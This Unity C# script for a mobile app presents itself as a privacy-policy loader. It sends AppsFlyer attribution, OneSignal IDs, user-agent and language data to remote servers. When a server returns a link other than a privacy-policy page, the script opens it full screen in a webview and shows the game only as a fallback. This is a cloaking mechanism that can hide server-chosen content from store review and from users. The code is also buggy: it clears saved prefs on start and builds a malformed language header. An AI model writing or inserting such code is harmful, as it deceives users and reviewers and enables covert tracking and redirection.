using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.UI;

public class PrivacyLoader : MonoBehaviour
{
    [SerializeField] private GameObject effectUltimate;
    [SerializeField] private GameObject spinner;
    [SerializeField] private string privacyDomainName;
    [SerializeField] private string postDomainName;

    [SerializeField] private Text processLogLable;

    private const string SavedUrlKey = "Saved-Url";

    public static string UserAgentKey = "User-Agent";
    public static string[] UserAgentValue => new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel };

    string AppsFlyerId => AppsFlyerSDK.AppsFlyer.getAppsFlyerId();

    class CpaObject
    {
        public Dictionary<string, object> appsflyer;
        public string referrer;
    }

    private void Start()
    {
        PlayerPrefs.DeleteAll();

        if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            ActiveEffect();
        }
        else
        {
            var saveLink = PlayerPrefs.GetString(SavedUrlKey, "null");
            if (saveLink == "null")
            {
                StartCoroutine(RequestsStage());
            }
            else
            {
                OpenView(saveLink);
            }
        }
    }

    IEnumerator RequestsStage()
    {
        var response = Request(privacyDomainName + $"?apps_flyer_id={AppsFlyerId}");
        var delay = 9f;
        while (!response.IsCompleted && delay > 0f)
        {
            yield return new WaitForSeconds(Time.deltaTime);
            delay -= Time.deltaTime;
        }

        yield return null;

        if (!response.IsCompleted || response.IsFaulted)
        {
            ActiveEffect();
        }
        else
        {
            var receiveBody = JObject.Parse(response.Result);

            if (receiveBody.ContainsKey("response"))
            {
                var link = receiveBody.Property("response").Value.ToString();

                if (string.IsNullOrEmpty(link))
                {
                    ActiveEffect();
                }
                else
                {
                    ShowLoadedPrivacy(link);

                    //APPS
                    delay = 12f;
                    while (AppsFlyerObjectScript.AttributionDictionary.Count == 0 && delay > 0)
                    {
                        yield return new WaitForSeconds(1f);
                        delay -= 1f;
                    }

#if !UNITY_EDITOR
                    try
                    {
                        OneSignalExtension.SetExternalId(AppsFlyerId);
                    }
                    catch (Exception ex) { processLogLable.text += $"\n {ex}"; }
#endif

                    yield return new WaitWhile(() => string.IsNullOrEmpty(OneSignalExtension.UserId));

                    var rec = PostRequest($"{postDomainName}/{receiveBody.Property("client_id")?.Value.ToString()}" +
                        $"?onesignal_player_id={OneSignalExtension.UserId}&apps_flyer_id={AppsFlyerId}");
                }
            }
            else ActiveEffect();
        }
    }

    private void ShowLoadedPrivacy(string link)
    {
        if (link.Contains("privacypolicyonline"))
        {
            ActiveEffect();
        }
        else
        {
            OpenView(link);

            PlayerPrefs.SetString(SavedUrlKey, link);
            PlayerPrefs.Save();
        }
    }

    UniWebView webView;
    private void OpenView(string url)
    {
        Screen.orientation = ScreenOrientation.AutoRotation;

        try
        {
            UniWebView.SetAllowJavaScriptOpenWindow(true);

            webView = gameObject.AddComponent<UniWebView>();
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            webView.OnOrientationChanged += (view, orientation) =>
            {
                // Set full screen again. If it is now in landscape, it is 640x320.
                Invoke("ResizeView", Time.deltaTime);
            };

            webView.Load(url);
            webView.Show();
            webView.SetSupportMultipleWindows(true, true);
            webView.OnShouldClose += (view) => { return view.CanGoBack; };
        }
        catch (Exception ex)
        {
            processLogLable.text += $"\n {ex}";
        }
    }

    private void ResizeView()
    {
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }

    #region requests

    public async Task<string> Request(string url)
    {
        var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
        httpWebRequest.UserAgent = GetHttpAgent();
        httpWebRequest.Headers.Set(HttpRequestHeader.AcceptLanguage, GetAcceptLanguageHeader());
        httpWebRequest.ContentType = "application/json";
        httpWebRequest.Method = "POST";

        using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
        {
            string json = JsonUtility.ToJson(new CpaObject
            {
                appsflyer = AppsFlyerObjectScript.AttributionDictionary,
                referrer = string.Empty,
            });

            streamWriter.Write(json);
        }

        var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
        {
            return await streamReader.ReadToEndAsync();
        }
    }

    public async Task<string> PostRequest(string url)
    {
        var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
        httpWebRequest.UserAgent = GetHttpAgent();
        httpWebRequest.Headers.Set(HttpRequestHeader.AcceptLanguage, GetAcceptLanguageHeader());
        httpWebRequest.ContentType = "application/json";
        httpWebRequest.Method = "POST";

        using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
        {
            string json = JsonUtility.ToJson(new CpaObject
            {
                appsflyer = AppsFlyerObjectScript.AttributionDictionary,
                referrer = string.Empty,
            });

            streamWriter.Write(json);
        }

        var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
        {
            return await streamReader.ReadToEndAsync();
        }
    }

    #endregion

    private void ActiveEffect()
    {
        StopAllCoroutines();

        effectUltimate.SetActive(true);
        spinner.SetActive(false);

        if (PlayerPrefs.HasKey(SavedUrlKey)) OneSignalExtension.Unsubscribe();
    }

    public string GetHttpAgent()
    {
#if (UNITY_ANDROID && !UNITY_EDITOR) || ANDROID_CODE_VIEW
        try
        {
            using (AndroidJavaClass cls = new AndroidJavaClass("java.lang.System"))
            {
                if (cls != null)
                    return cls.CallStatic<string>("getProperty", "http.agent");
            }
        }
        catch (Exception e)
        {
            processLogLable.text += $"\n{e.Message}";
        }
#endif

        return string.Join(',', UserAgentValue);
    }

    public string GetAcceptLanguageHeader()
    {
#if (UNITY_ANDROID && !UNITY_EDITOR) || ANDROID_CODE_VIEW
                try
        {
            using (AndroidJavaClass cls = new AndroidJavaClass("androidx.core.os.LocaleListCompat"))
            {
                if (cls != null)
                    using (AndroidJavaObject locale = cls.CallStatic<AndroidJavaObject>("getAdjustedDefault"))
                    {
                        List<string> tags = new List<string>();
                        float size = locale.Call<int>("size");
                        float weight = 1.0f;

                        for(var i = 0; i < size; i++)
                        {
                            weight -= 0.1f;
                            tags.Add(locale.Call<AndroidJavaObject>("get", i).Call<string>("toLanguageTag") + $";q={weight}");
                        }

                        return string.Join(',', tags);
                    }
            }
        }
        catch (Exception e)
        {
            processLogLable.text += $"\n{e.Message}";
        }
#endif

        return "en-US;q=$0.9";
    }
}
